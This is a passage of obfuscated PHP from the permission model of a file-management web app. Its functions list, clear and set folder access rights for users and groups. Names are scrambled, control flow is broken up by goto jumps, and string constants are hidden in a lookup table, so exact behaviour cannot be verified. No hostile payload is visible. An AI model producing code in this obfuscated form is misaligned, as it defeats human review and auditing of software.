$fá‡ÏÒ½…Æ[1798] => intval($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[1798]]) ? intval($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[1798]]) : -1); } $this->where(array($fá‡ÏÒ½…Æ[408] => $E†š–¾…ù))->delete(); $this->addAll($fæç—À¤–); goto AÓŒ†«ƒí•; CœŠ°¢¨ñ¥: if ($aÛÓ†åÎãÓ[$fá‡ÏÒ½…Æ[396]] != SourceModel::TYPE_GROUP) { return !1; } $AÄ‘Ê×Ë = 1; $E±ññÎ˜‚ = $aÛÓ†åÎãÓ[$fá‡ÏÒ½…Æ[482]]; goto dŒ¶ÇÖ÷µ®; AÓŒ†«ƒí•: return !0; goto A˜¬ÄöÊ¥; dŒ¶ÇÖ÷µ®: if ($E±ññÎ˜‚ != $AÄ‘Ê×Ë) { $BÀ‰ê¼ÖÀä = array($fá‡ÏÒ½…Æ[1648] => $E±ññÎ˜‚); $c®İÏ«§‚¹ = Model($fá‡ÏÒ½…Æ[1731])->field($fá‡ÏÒ½…Æ[1489])->where($BÀ‰ê¼ÖÀä)->select(); $c®İÏ«§‚¹ = array_to_keyvalue($c®İÏ«§‚¹, $fá‡ÏÒ½…Æ[33], $fá‡ÏÒ½…Æ[1489]); } $Dá±‹ëÓÖ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $fæç—À¤– = array(); goto aÛ—œÆÏÎ; C¿¹ğŠîñ: $fá‡ÏÒ½…Æ =& $_SERVER[¢Í]; $aÛÓ†åÎãÓ = Model($fá‡ÏÒ½…Æ[1169])->sourceInfo($E†š–¾…ù); if (!$aÛÓ†åÎãÓ) { return !1; } goto CœŠ°¢¨ñ¥; A˜¬ÄöÊ¥: } public function authClear($e´„½³Š‰É) { $Fï…˜é”‘„ =& $_SERVER[¢Í]; $dŞÔŒ»àƒä = Model($Fï…˜é”‘„[1169])->sourceInfo($e´„½³Š‰É); $dÑªœ„ÚŒØ = array($e´„½³Š‰É); if ($dŞÔŒ»àƒä[$Fï…˜é”‘„[395]] == $Fï…˜é”‘„[93]) { $C”Ê…ñŒ… = array($Fï…˜é”‘„[551] => array($Fï…˜é”‘„[509], $dŞÔŒ»àƒä[$Fï…˜é”‘„[485]] . $e´„½³Š‰É . $Fï…˜é”‘„[510])); $dÑªœ„ÚŒØ = Model($Fï…˜é”‘„[1169])->field($Fï…˜é”‘„[408])->where($C”Ê…ñŒ…)->getField($Fï…˜é”‘„[394], !0); $dÑªœ„ÚŒØ[] = $e´„½³Š‰É; } $this->where(array($Fï…˜é”‘„[408] => array($Fï…˜é”‘„[409], $dÑªœ„ÚŒØ)))->delete(); return !0; } public function getAllChildren($Bå¼Ü¬İ”Ì) { goto FÔÆµìëçß; AìÏš¤»•›: return $this->sourceListAuth($D¤ñçâ¢­); goto f‡Šèêë¼; FØ–¢’Îî: $A±¿ì¹Ëõæ = Model($FˆÌˆŞ¦Ò[765])->field($e ³²Ùƒ)->where($bå‰òÚ³ÏŒ)->select(); $D¤ñçâ¢­ = array($Bå¼Ü¬İ”Ì); foreach ($A±¿ì¹Ëõæ as $Céœà¶¨ªğ) { foreach ($CÌÔ¾è©® as $Eå‹‹ãî‹‰) { $B…²ÎÊÏ— = $FˆÌˆŞ¦Ò[47] . $Eå‹‹ãî‹‰ . $FˆÌˆŞ¦Ò[47]; $f—Ò°›Ñ = $Céœà¶¨ªğ[$FˆÌˆŞ¦Ò[485]] . $Céœà¶¨ªğ[$FˆÌˆŞ¦Ò[394]] . $FˆÌˆŞ¦Ò[47]; if (strstr($f—Ò°›Ñ, $B…²ÎÊÏ—)) { $D¤ñçâ¢­[] = $Céœà¶¨ªğ[$FˆÌˆŞ¦Ò[394]]; break; } } } goto AìÏš¤»•›; FÔÆµìëçß: $FˆÌˆŞ¦Ò =& $_SERVER[¢Í]; $Aïï¾Ú°ââ = Model($FˆÌˆŞ¦Ò[1169])->sourceInfo($Bå¼Ü¬İ”Ì); if ($Aïï¾Ú°ââ[$FˆÌˆŞ¦Ò[395]] != $FˆÌˆŞ¦Ò[93]) { return $this->sourceListAuth(array($Bå¼Ü¬İ”Ì)); } goto F—áğ‰ØŒ˜; Aˆäì‚ĞÀ: if ($Aïï¾Ú°ââ[$FˆÌˆŞ¦Ò[487]] == $FˆÌˆŞ¦Ò[494] && $Aïï¾Ú°ââ[$FˆÌˆŞ¦Ò[482]] != $e‚Î¨®™¿°) { $CÌÔ¾è©® = $this->groupChidldAllRootSource($Aïï¾Ú°ââ[$FˆÌˆŞ¦Ò[482]]); } $E©»Ä˜ñÄ = $this->field($FˆÌˆŞ¦Ò[394])->group($FˆÌˆŞ¦Ò[394])->select(); $E©»Ä˜ñÄ = array_to_keyvalue($E©»Ä˜ñÄ, $FˆÌˆŞ¦Ò[33], $FˆÌˆŞ¦Ò[394]); goto cŠ“º¬ÒØ; F—áğ‰ØŒ˜: if ($Aïï¾Ú°ââ[$FˆÌˆŞ¦Ò[396]] != SourceModel::TYPE_GROUP) { return array(); } $e‚Î¨®™¿° = 1; $CÌÔ¾è©® = array($Bå¼Ü¬İ”Ì); goto Aˆäì‚ĞÀ; cŠ“º¬ÒØ: if (!$E©»Ä˜ñÄ) { return array(); } $e ³²Ùƒ = $FˆÌˆŞ¦Ò[1819]; $bå‰òÚ³ÏŒ = array($FˆÌˆŞ¦Ò[394] => array($FˆÌˆŞ¦Ò[7], $E©»Ä˜ñÄ), $FˆÌˆŞ¦Ò[422] => $FˆÌˆŞ¦Ò[494]); goto FØ–¢’Îî; f‡Šèêë¼: } private function sourceListAuth($DĞ‹±ñƒº–) { goto d½‚Æøì¬§; d½‚Æøì¬§: $C¹¥¨‡œ =& $_SERVER[¢Í]; $cïÉé”àÜ = Model($C¹¥¨‡œ[1169])->sourceListInfo($DĞ‹±ñƒº–, !0); $A¬ …Äœ» = $C¹¥¨‡œ[1816]; goto e”´Œ­ƒ; FŞ´È Ï«Ş: $eğ˜³‰¶İŞ = array(); foreach ($cïÉé”àÜ as $f„ç¨äÆ´‡) { goto eº ¹‹†—í; BÎ¾Óá‰: $F’Êªë¸Ò¿ = count(explode($C¹¥¨‡œ[8], trim($f„ç¨äÆ´‡[$C¹¥¨‡œ[492]], $C¹¥¨‡œ[8]))); $eğ˜³‰¶İŞ[] = $F’Êªë¸Ò¿ + ($f„ç¨äÆ´‡[$C¹¥¨‡œ[29]] == $C¹¥¨‡œ[86] ? 0 : 1000); goto B¿Ğ¢ëƒî‰; eº ¹‹†—í: unset($f„ç¨äÆ´‡[$C¹¥¨‡œ[404]]); unset($f„ç¨äÆ´‡[$C¹¥¨‡œ[403]]); unset($f„ç¨äÆ´‡[$C¹¥¨‡œ[401]]); goto b§ŠÃ¤‹¿é; b§ŠÃ¤‹¿é: unset($f„ç¨äÆ´‡[$C¹¥¨‡œ[416]]); $eÜÆ™Äó¯ = $aÈÔåá¦£¡[$f„ç¨äÆ´‡[$C¹¥¨‡œ[394]]]; if (!$eÜÆ™Äó¯) { continue; } goto BƒÏÅŸ°Ö; BƒÏÅŸ°Ö: $f„ç¨äÆ´‡[$C¹¥¨‡œ[1820]] = $this->authTargetInfo($eÜÆ™Äó¯); $f„ç¨äÆ´‡[$C¹¥¨‡œ[492]] = rtrim($f„ç¨äÆ´‡[$C¹¥¨‡œ[488]], $C¹¥¨‡œ[8]) . $C¹¥¨‡œ[8] . ltrim($f„ç¨äÆ´‡[$C¹¥¨‡œ[492]], $C¹¥¨‡œ[8]); $FÕÚí„†Ó¼[] = $f„ç¨äÆ´‡; goto BÎ¾Óá‰; B¿Ğ¢ëƒî‰: } array_multisort($eğ˜³‰¶İŞ, SORT_ASC, $FÕÚí„†Ó¼); goto cÑùæÍÓí; cÑùæÍÓí: return $FÕÚí„†Ó¼; goto AÑ¿ƒÑ©Ü‡; e”´Œ­ƒ: $CÜ–¥¯í¯ª = $this->field($A¬ …Äœ»)->where(array($C¹¥¨‡œ[394] => array($C¹¥¨‡œ[7], $DĞ‹±ñƒº–)))->select(); $aÈÔåá¦£¡ = array_to_keyvalue_group($CÜ–¥¯í¯ª, $C¹¥¨‡œ[394]); $FÕÚí„†Ó¼ = array(); goto FŞ´È Ï«Ş; AÑ¿ƒÑ©Ü‡: } private function groupChidldAllRootSource($D†ßï³ÒâÀ) { $B°Ÿõ…”Å‹ =& $_SERVER[¢Í]; $a±¾¬È”Ø¬ = Model($B°Ÿõ…”Å‹[1821])->groupChildrenAll($D†ßï³ÒâÀ); $Eïä£×•Üî = array($B°Ÿõ…”Å‹[487] => 0, $B°Ÿõ…”Å‹[482] => array($B°Ÿõ…”Å‹[7], $a±¾¬È”Ø¬), $B°Ÿõ…”Å‹[396] => SourceModel::TYPE_GROUP); $C¹”¾ÄÑ°ì = Model($B°Ÿõ…”Å‹[765])->field($B°Ÿõ…”Å‹[394])->where($Eïä£×•Üî)->select(); $C¹”¾ÄÑ°ì = array_to_keyvalue($C¹”¾ÄÑ°ì, $B°Ÿõ…”Å‹[33], $B°Ÿõ…”Å‹[394]); return $C¹”¾ÄÑ°ì; } private function authTargetInfo($Eºãƒ•ìİÇ) { goto FÌ»æ¬ÀÍ; D«…™ƒñ„ª: $dÙŸ”ÅÁ¢¿ = 2 << 25; foreach ($Eºãƒ•ìİÇ as $eÖğ†ÔËœÒ) { goto Dé˜ÛÓ®¾÷; cÚêàê‚çñ: if (!$A†àí–£­¥) { continue; } $A†àí–£­¥[$DÑ¦Îâ‚‡µ[443]] = $AÏ†³ÙŠ„Ş; $DÛç¢ˆ”´©[] = $A†àí–£­¥; goto e¨Ô‘İ; bÀù‘¯ó¥…: if ($eÖğ†ÔËœÒ[$DÑ¦Îâ‚‡µ[396]] == SourceModel::TYPE_USER && $eÖğ†ÔËœÒ[$DÑ¦Îâ‚‡µ[482]] == $DÑ¦Îâ‚‡µ[494]) { $Cñ¸±Î³³› = 0; } $aÈ‹ïµñå[] = $AÏ†³ÙŠ„Ş[$DÑ¦Îâ‚‡µ[401]] + $Cñ¸±Î³³›; goto D‚ÔÖ©‘ãÊ; e¨Ô‘İ: $Cñ¸±Î³³› = 0; if ($eÖğ†ÔËœÒ[$DÑ¦Îâ‚‡µ[396]] == SourceModel::TYPE_GROUP) { $Cñ¸±Î³³› = $dÙŸ”ÅÁ¢¿ * 2; } if ($eÖğ†ÔËœÒ[$DÑ¦Îâ‚‡µ[396]] == SourceModel::TYPE_USER) { $Cñ¸±Î³³› = $dÙŸ”ÅÁ¢¿; } goto bÀù‘¯ó¥…; Dé˜ÛÓ®¾÷: $AÏ†³ÙŠ„Ş = Model($DÑ¦Îâ‚‡µ[1817])->listData($eÖğ†ÔËœÒ[$DÑ¦Îâ‚‡µ[1797]]); if (!$AÏ†³ÙŠ„Ş) { continue; } if ($eÖğ†ÔËœÒ[$DÑ¦Îâ‚‡µ[396]] == SourceModel::TYPE_USER) { $A†àí–£­¥ = Model($DÑ¦Îâ‚‡µ[500])->getInfoSimpleOuter($eÖğ†ÔËœÒ[$DÑ¦Îâ‚‡µ[482]]); if ($A†àí–£­¥[$DÑ¦Îâ‚‡µ[1489]] == $DÑ¦Îâ‚‡µ[1052]) { continue; } if ($A†àí–£­¥[$DÑ¦Îâ‚‡µ[1489]] == $DÑ¦Îâ‚‡µ[494]) { $A†àí–£­¥[$DÑ¦Îâ‚‡µ[28]] = LNG($DÑ¦Îâ‚‡µ[1822]); } } else { $A†àí–£­¥ = Model($DÑ¦Îâ‚‡µ[484])->getInfoSimple($eÖğ†ÔËœÒ[$DÑ¦Îâ‚‡µ[482]]); } goto cÚêàê‚çñ; D‚ÔÖ©‘ãÊ: } array_multisort($aÈ‹ïµñå, SORT_DESC, $DÛç¢ˆ”´©); goto a¸Ç£á£¡Ë; FÌ»æ¬ÀÍ: $DÑ¦Îâ‚‡µ =& $_SERVER[¢Í]; $DÛç¢ˆ”´© = array(); $aÈ‹ïµñå = array(); goto D«…™ƒñ„ª; a¸Ç£á£¡Ë: return $DÛç¢ˆ”´©; goto D‡£æ†ÜÍ; D‡£æ†ÜÍ: } public function getAllChildrenByUser($AÀø½µ¹ö­, $Bâ¾„îîÁÚ) { goto EÆ×»çã¿»; EÆ×»çã¿»: $BÎ„Ù·ÙŒ =& $_SERVER[¢Í]; $D‹…¿Í‚‡Â = Model($BÎ„Ù·ÙŒ[503])->getInfo($Bâ¾„îîÁÚ); if (!$Bâ¾„îîÁÚ || !$AÀø½µ¹ö­ || !$D‹…¿Í‚‡Â) { return array(); } goto dÙ¥Éæ±¬«; dÙ¥Éæ±¬«: $a£î×ÉæŞ = Model($BÎ„Ù·ÙŒ[1169])->sourceInfo($AÀø½µ¹ö­); $Bô÷‘â÷ãÂ = array(); $c‡¾¿‚šŒ¨ = 1; goto Aã‘³ƒó¤ö; Aã‘³ƒó¤ö: if ($a£î×ÉæŞ[$BÎ„Ù·ÙŒ[487]] == $BÎ„Ù·ÙŒ[494] && $a£î×ÉæŞ[$BÎ„Ù·ÙŒ[482]] != $c‡¾¿‚šŒ¨ && $this->groupContainUser($a£î×ÉæŞ[$BÎ„Ù·ÙŒ[482]], $Bâ¾„îîÁÚ)) { foreach ($D‹…¿Í‚‡Â[$BÎ„Ù·ÙŒ[1823]] as $c¿ì¬ó©Ë) { $dĞ‹‡­å¦ = Model($BÎ„Ù·ÙŒ[484])->getInfo($c¿ì¬ó©Ë[$BÎ„Ù·ÙŒ[1648]]); $båè¸ŒØŞ¶ = Model($BÎ„Ù·ÙŒ[503])->getInfoSimpleOuter($Bâ¾„îîÁÚ); $båè¸ŒØŞ¶[$BÎ„Ù·ÙŒ[443]] = $c¿ì¬ó©Ë[$BÎ„Ù·ÙŒ[401]]; if (Model($BÎ„Ù·ÙŒ[1817])->authCheckAction($c¿ì¬ó©Ë[$BÎ„Ù·ÙŒ[401]][$BÎ„Ù·ÙŒ[401]], $BÎ„Ù·ÙŒ[1668])) { continue; } $D¯Ê¦‚®² = array($BÎ„Ù·ÙŒ[28] => $BÎ„Ù·ÙŒ[1441] . $dĞ‹‡­å¦[$BÎ„Ù·ÙŒ[28]], $BÎ„Ù·ÙŒ[394] => $dĞ‹‡­å¦[$BÎ„Ù·ÙŒ[416]][$BÎ„Ù·ÙŒ[394]], $BÎ„Ù·ÙŒ[85] => KodIO::make($dĞ‹‡­å¦[$BÎ„Ù·ÙŒ[416]][$BÎ„Ù·ÙŒ[394]]), $BÎ„Ù·ÙŒ[487] => $BÎ„Ù·ÙŒ[494], $BÎ„Ù·ÙŒ[396] => $BÎ„Ù·ÙŒ[983], $BÎ„Ù·ÙŒ[29] => $BÎ„Ù·ÙŒ[514], $BÎ„Ù·ÙŒ[492] => $dĞ‹‡­å¦[$BÎ„Ù·ÙŒ[489]], $BÎ„Ù·ÙŒ[1648] => $dĞ‹‡­å¦[$BÎ„Ù·ÙŒ[1648]], $BÎ„Ù·ÙŒ[486] => $dĞ‹‡­å¦[$BÎ„Ù·ÙŒ[487]], $BÎ„Ù·ÙŒ[1820] => array($båè¸ŒØŞ¶)); $Bô÷‘â÷ãÂ[$D¯Ê¦‚®²[$BÎ„Ù·ÙŒ[394]]] = $D¯Ê¦‚®²; } } $cƒ®—ó©î¨ = array(); $b¥¼´œµ¼´ = $this->getAllChildren($AÀø½µ¹ö­); goto d½ÂëøÌÑŸ; d½ÂëøÌÑŸ: foreach ($b¥¼´œµ¼´ as $EÜÃºâñÄ©) { $fÃğéò»Û´ = !1; foreach ($EÜÃºâñÄ©[$BÎ„Ù·ÙŒ[1820]] as $B´ÀÂÌ’Ø) { if ($B´ÀÂÌ’Ø[$BÎ„Ù·ÙŒ[1489]]) { if ($B´ÀÂÌ’Ø[$BÎ„Ù·ÙŒ[1489]] == $Bâ¾„îîÁÚ) { $fÃğéò»Û´ = !0; break; } } if ($B´ÀÂÌ’Ø[$BÎ„Ù·ÙŒ[1648]]) { if ($this->groupContainUser($B´ÀÂÌ’Ø[$BÎ„Ù·ÙŒ[1648]], $Bâ¾„îîÁÚ)) { $fÃğéò»Û´ = !0; break; } } } if ($fÃğéò»Û´) { $cƒ®—ó©î¨[] = $EÜÃºâñÄ©; } $DØêœ«’²µ = $EÜÃºâñÄ©[$BÎ„Ù·ÙŒ[394]]; if (isset($Bô÷‘â÷ãÂ[$DØêœ«’²µ])) { $EÜÃºâñÄ©[$BÎ„Ù·ÙŒ[1820]][] = $Bô÷‘â÷ãÂ[$DØêœ«’²µ][0]; $Bô÷‘â÷ãÂ[$DØêœ«’²µ] = !1; } } $Bô÷‘â÷ãÂ = array_filter(array_values($Bô÷‘â÷ãÂ)); $cƒ®—ó©î¨ = array_merge($Bô÷‘â÷ãÂ, $cƒ®—ó©î¨); goto AĞĞ‰éÖË; AĞĞ‰éÖË: return $cƒ®—ó©î¨; goto cˆÃ­Œ˜…ç; cˆÃ­Œ˜…ç: } public function setAllChildrenByUser($f¯¹›œ›³„, $A½¢Ûñµèª, $E…§ì†£·) { $d¬¹ä—°Š =& $_SERVER[¢Í]; $dŠ´à†°¬• = $this->getAllChildrenByUser($f¯¹›œ›³„, $A½¢Ûñµèª); if (!$E…§ì†£· || !$dŠ´à†°¬•) { return !1; } foreach ($dŠ´à†°¬• as $DáÊà ù±¡) { $C×ºÍ«•”ª = array(); foreach ($DáÊà ù±¡[$d¬¹ä—°Š[1820]] as $fàğì°ËØò) { $Cè‚ùÖ–ô = $fàğì°ËØò[$d¬¹ä—°Š[443]]; $e¼Æœ†õ¯Î = $fàğì°ËØò[$d¬¹ä—°Š[1489]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $bâ†ƒõğ¼ = $fàğì°ËØò[$d¬¹ä—°Š[1489]] ? $fàğì°ËØò[$d¬¹ä—°Š[1489]] : $fàğì°ËØò[$d¬¹ä—°Š[1648]]; if ($fàğì°ËØò[$d¬¹ä—°Š[1489]] && $fàğì°ËØò[$d¬¹ä—°Š[1489]] == $A½¢Ûñµèª) { continue; } $C×ºÍ«•”ª[] = array($d¬¹ä—°Š[394] => $DáÊà ù±¡[$d¬¹ä—°Š[394]], $d¬¹ä—°Š[396] => $e¼Æœ†õ¯Î, $d¬¹ä—°Š[482] => intval($bâ†ƒõğ¼), $d¬¹ä—°Š[1797] => isset($Cè‚ùÖ–ô[$d¬¹ä—°Š[392]]) ? intval($Cè‚ùÖ–ô[$d¬¹ä—°Š[392]]) : 0, $d¬¹ä—°Š[1798] => isset($Cè‚ùÖ–ô[$d¬¹ä—°Š[1798]]) ? intval($Cè‚ùÖ–ô[$d¬¹ä—°Š[1798]]) : -1); } $C×ºÍ«•”ª[] = array($d¬¹ä—°Š[394] => $DáÊà ù±¡[$d¬¹ä—°Š[394]], $d¬¹ä—°Š[396] => SourceModel::TYPE_USER, $d¬¹ä—°Š[482] => intval($A½¢Ûñµèª), $d¬¹ä—°Š[1797] => intval($E…§ì†£·), $d¬¹ä—°Š[1798] => -1); $this->where(array($d¬¹ä—°Š[408] => $DáÊà ù±¡[$d¬¹ä—°Š[394]]))->delete(); $this->addAll($C×ºÍ«•”ª); } return !0; } public function get($c¬¯ŒÁ‘Ş) { $aë²ìê“ò¨ = $this->getSourceList(array($c¬¯ŒÁ‘Ş), !0); return $aë²ìê“ò¨[0]; } public function getSourceList($e¥ßãß¾Í², $Aš«ßÄ”àÆ = false, $BÅê¥ÎÁà = false) { goto D¹¾Â–ÅÄÁ; E®–Š¡¥—Ï: $C­ÀˆÃß± = array_to_keyvalue_group($C­ÀˆÃß±, $eˆŠ¥ô±[394]); $CöˆÃ„Ã¤ = array(); foreach ($E™Æôœæàò as $còó¯µ —à) { if (isset($C­ÀˆÃß±[$còó¯µ —à])) { $CöˆÃ„Ã¤[$còó¯µ —à] = $C­ÀˆÃß±[$còó¯µ —à]; } } goto a¼„ò©ÓÚ; eà—‰–Ûƒ‘: $bÙÅÅè’×¡ = array(); foreach ($Aš«ßÄ”àÆ as $còó¯µ —à => $eİ›÷ÔßæØ) { if ($FÁù¹ŠÔ›Å) { $bÙÅÅè’×¡[$còó¯µ —à] = $a´†ÎÊ†İ; continue; } $bÙÅÅè’×¡[$còó¯µ —à] = $this->makeSourceAuth($eİ›÷ÔßæØ, $CöˆÃ„Ã¤, $BÅê¥ÎÁà); } return $bÙÅÅè’×¡; goto FÅÂ¬÷§½; b÷İ°ŒƒƒÀ: if (!$Aš«ßÄ”àÆ && count($e¥ßãß¾Í²) == 1) { $Aš«ßÄ”àÆ = array(); $Aš«ßÄ”àÆ[$e¥ßãß¾Í²[0]] = $EíĞ´Ùö->sourceInfo($e¥ßãß¾Í²[0]); } if (!$Aš«ßÄ”àÆ) { $F¬äáå¶ç = array($eˆŠ¥ô±[408] => array($eˆŠ¥ô±[409], $e¥ßãß¾Í²)); $Aš«ßÄ”àÆ = $EíĞ´Ùö->field($eˆŠ¥ô±[1824])->where($F¬äáå¶ç)->select(); $Aš«ßÄ”àÆ = array_to_keyvalue($Aš«ßÄ”àÆ, $eˆŠ¥ô±[394]); } $E™Æôœæàò = $e¥ßãß¾Í²; goto bÉ×‚åôš; dˆàöä½: $bİ–‡ÓŞ¨ò = $eˆŠ¥ô±[1825]; $F¬äáå¶ç = array($eˆŠ¥ô±[408] => array($eˆŠ¥ô±[409], $E™Æôœæàò)); $C­ÀˆÃß± = $this->field($bİ–‡ÓŞ¨ò)->where($F¬äáå¶ç)->select(); goto E®–Š¡¥—Ï; D¹¾Â–ÅÄÁ: $eˆŠ¥ô± =& $_SERVER[¢Í]; if (!$e¥ßãß¾Í²) { return array(); } $EíĞ´Ùö = Model($eˆŠ¥ô±[1169]); goto b÷İ°ŒƒƒÀ; bÉ×‚åôš: foreach ($Aš«ßÄ”àÆ as $aËãé»©õÈ => $BšŒô³·) { $F£­³‹Ï = $EíĞ´Ùö->parentLevelArray($BšŒô³·[$eˆŠ¥ô±[485]]); $E™Æôœæàò = array_merge($E™Æôœæàò, array($aËãé»©õÈ), array_reverse($F£­³‹Ï)); } $E™Æôœæàò = array_values(array_unique($E™Æôœæàò)); if (!$E™Æôœæàò) { return array(); } goto dˆàöä½; a¼„ò©ÓÚ: $FÁù¹ŠÔ›Å = $this->userIsRoot($BÅê¥ÎÁà); $C÷ÆÏ…Ù = AuthModel::authAll(); $a´†ÎÊ†İ = array($eˆŠ¥ô±[402] => $C÷ÆÏ…Ù, $eˆŠ¥ô±[1826] => array($eˆŠ¥ô±[410] => 0, $eˆŠ¥ô±[1654] => $C÷ÆÏ…Ù, $eˆŠ¥ô±[411] => LNG($eˆŠ¥ô±[1827]), $eˆŠ¥ô±[1669] => $eˆŠ¥ô±[1828])); goto eà—‰–Ûƒ‘; FÅÂ¬÷§½: } public function authDeepCheck($A‡±ÕØ×âº, $b‡£æ’¸ƒğ = false) { goto dñÆŞšˆ‰§; dñÆŞšˆ‰§: $e”—Õ®Ëë¥ =& $_SERVER[¢Í]; $b‡£æ’¸ƒğ = $b‡£æ’¸ƒğ ? $b‡£æ’¸ƒğ : USER_ID; $AÄ¿îóø· = $this->makeAuthDeep($b‡£æ’¸ƒğ); goto B„“éÜÛ‚›; B„“éÜÛ‚›: if (!in_array($A‡±ÕØ×âº, $AÄ¿îóø·[$e”—Õ®Ëë¥[1829]])) { return !1; } $A×¹ÈøÊŠÜ = array(); foreach ($AÄ¿îóø·[$e”—Õ®Ëë¥[1830]] as $F†±§“å => $fÜŞÜŠà¦) { if (!in_array($A‡±ÕØ×âº, $fÜŞÜŠà¦)) { continue; } $A×¹ÈøÊŠÜ[] = $F†±§“å; } goto d‰‚•æÓ›; d‰‚•æÓ›: $C—”­Ô´°ğ = $A×¹ÈøÊŠÜ ? $A×¹ÈøÊŠÜ[0] : $A‡±ÕØ×âº; return array($e”—Õ®Ëë¥[402] => -1, $e”—Õ®Ëë¥[443] => array($e”—Õ®Ëë¥[410] => $e”—Õ®Ëë¥[1052], $e”—Õ®Ëë¥[1654] => $e”—Õ®Ëë¥[494], $e”—Õ®Ëë¥[411] => LNG($e”—Õ®Ëë¥[1831]), $e”—Õ®Ëë¥[1669] => $e”—Õ®Ëë¥[1832]), $e”—Õ®Ëë¥[1833] => LNG($e”—Õ®Ëë¥[1834]), $e”—Õ®Ëë¥[1835] => $this->sourceAuthInfo($C—”­Ô´°ğ)); goto e‰Ùº£¯ÒÏ; e‰Ùº£¯ÒÏ: } protected function makeAuthDeep($d’ê‡¢ˆ¨œ = false) { goto c¾ã×ùÛìˆ; F÷…¦ç­ Ê: foreach ($FÒªˆÄ°‘õ as $b–°ÀÊÀÛÒ) { if ($b–°ÀÊÀÛÒ[$eĞâˆ´Å‡«[401]] == 0 && $b–°ÀÊÀÛÒ[$eĞâˆ´Å‡«[1670]] == $eĞâˆ´Å‡«[93]) { $e˜ÈÇ ×Çµ[] = $b–°ÀÊÀÛÒ[$eĞâˆ´Å‡«[392]]; } } $aœ¿‡Ëƒ“« = $this->userGroupParents($d’ê‡¢ˆ¨œ); $e¿ìˆï¥Àó = array($eĞâˆ´Å‡«[396] => SourceModel::TYPE_USER, $eĞâˆ´Å‡«[482] => $d’ê‡¢ˆ¨œ); goto A‰†±°—ø’; c¾ã×ùÛìˆ: $eĞâˆ´Å‡« =& $_SERVER[¢Í]; static $cá•¼ºÅëœ = array(); $d’ê‡¢ˆ¨œ = $d’ê‡¢ˆ¨œ ? $d’ê‡¢ˆ¨œ : USER_ID; goto f¡™‚Ÿí¢¹; bÆœçŒµ•: foreach ($Bà†ƒœ×’ as $eËÀáÓ¦˜) { $Fò„§Ö…¿ = $c¼¡Ÿó½ƒ”->getInfo($eËÀáÓ¦˜); $f®‹Ôùš¿¡[] = $Fò„§Ö…¿[$eĞâˆ´Å‡«[416]][$eĞâˆ´Å‡«[394]]; $fÅ©é•¢´…[$eËÀáÓ¦˜] = $Fò„§Ö…¿[$eĞâˆ´Å‡«[416]][$eĞâˆ´Å‡«[394]]; $F§ØŠÃ†”˜[$eËÀáÓ¦˜] = $B±ßé­Î->parentLevelArray($Fò„§Ö…¿[$eĞâˆ´Å‡«[485]]); } foreach ($Eí£Ç™ÇÀŒ as $F´Ôßğğ÷ => $A½íØ’ÔØß) { $Eï¶´éà¾ç = $Dƒ¤»¢À´[$F´Ôßğğ÷]; if (!$Eï¶´éà¾ç || !$fÅ©é•¢´…[$Eï¶´éà¾ç]) { continue; } $FÚ äèÃÅé = array(); foreach ($F§ØŠÃ†”˜[$Eï¶´éà¾ç] as $eËÀáÓ¦˜) { $FÚ äèÃÅé[] = $fÅ©é•¢´…[$eËÀáÓ¦˜]; } $Eí£Ç™ÇÀŒ[$F´Ôßğğ÷] = array_merge($FÚ äèÃÅé, $A½íØ’ÔØß); } $f®‹Ôùš¿¡ = array_values(array_unique($f®‹Ôùš¿¡)); goto eÊèÖÇ°¥×; f¡™‚Ÿí¢¹: if (isset($cá•¼ºÅëœ[$d’ê‡¢ˆ¨œ])) { return $cá•¼ºÅëœ[$d’ê‡¢ˆ¨œ]; } $FÒªˆÄ°‘õ = Model($eĞâˆ´Å‡«[1836])->listData(); $e˜ÈÇ ×Çµ = array(); goto F÷…¦ç­ Ê; b›ÓÜì•¬¶: $Eí£Ç™ÇÀŒ = array(); $Dƒ¤»¢À´ = array(); $fÅ©é•¢´… = array(); goto F¶ó„…˜šª; A‰†±°—ø’: if ($aœ¿‡Ëƒ“«) { $e¿ìˆï¥Àó = array(array($eĞâˆ´Å‡«[396] => SourceModel::TYPE_USER, $eĞâˆ´Å‡«[482] => $d’ê‡¢ˆ¨œ), array($eĞâˆ´Å‡«[396] => SourceModel::TYPE_GROUP, $eĞâˆ´Å‡«[482] => array($eĞâˆ´Å‡«[409], $aœ¿‡Ëƒ“«)), $eĞâˆ´Å‡«[925] => $eĞâˆ´Å‡«[1737]); } $BÀ·ÜÀÅµÄ = $this->field($eĞâˆ´Å‡«[1837])->where($e¿ìˆï¥Àó)->select(); $CˆÜ‰ª¢ó† = array(); goto ešˆà˜ôÎ‚; f¥¸‘¯İ’Š: $Cå†±¸ºò = $Bà†ƒœ×’; foreach ($Cå†±¸ºò as $eËÀáÓ¦˜) { $Fò„§Ö…¿ = $c¼¡Ÿó½ƒ”->getInfo($eËÀáÓ¦˜); $aÑ—‹„¥Ó = $B±ßé­Î->parentLevelArray($Fò„§Ö…¿[$eĞâˆ´Å‡«[485]]); $Bà†ƒœ×’ = array_merge($Bà†ƒœ×’, $aÑ—‹„¥Ó); } $Bà†ƒœ×’ = array_values(array_unique($Bà†ƒœ×’)); goto bÆœçŒµ•; F¶ó„…˜šª: $F§ØŠÃ†”˜ = array(); if ($CˆÜ‰ª¢ó†) { $dŞ£±ù›³Œ = $B±ßé­Î->where(array($eĞâˆ´Å‡«[394] => array($eĞâˆ´Å‡«[409], $CˆÜ‰ª¢ó†)))->select(); foreach ($dŞ£±ù›³Œ as $A¥™¸ÓÀ—¿) { $aÑ—‹„¥Ó = $B±ßé­Î->parentLevelArray($A¥™¸ÓÀ—¿[$eĞâˆ´Å‡«[485]]); $f®‹Ôùš¿¡ = array_merge($f®‹Ôùš¿¡, $aÑ—‹„¥Ó); $Bà†ƒœ×’[] = $A¥™¸ÓÀ—¿[$eĞâˆ´Å‡«[482]]; $Eí£Ç™ÇÀŒ[$A¥™¸ÓÀ—¿[$eĞâˆ´Å‡«[394]]] = $aÑ—‹„¥Ó; $Dƒ¤»¢À´[$A¥™¸ÓÀ—¿[$eĞâˆ´Å‡«[394]]] = $A¥™¸ÓÀ—¿[$eĞâˆ´Å‡«[482]]; } } $Bà†ƒœ×’ = array_values(array_unique($Bà†ƒœ×’)); goto f¥¸‘¯İ’Š; c³¹šùˆ„ö: $Bà†ƒœ×’ = $aœ¿‡Ëƒ“«; $B±ßé­Î = Model($eĞâˆ´Å‡«[1169]); 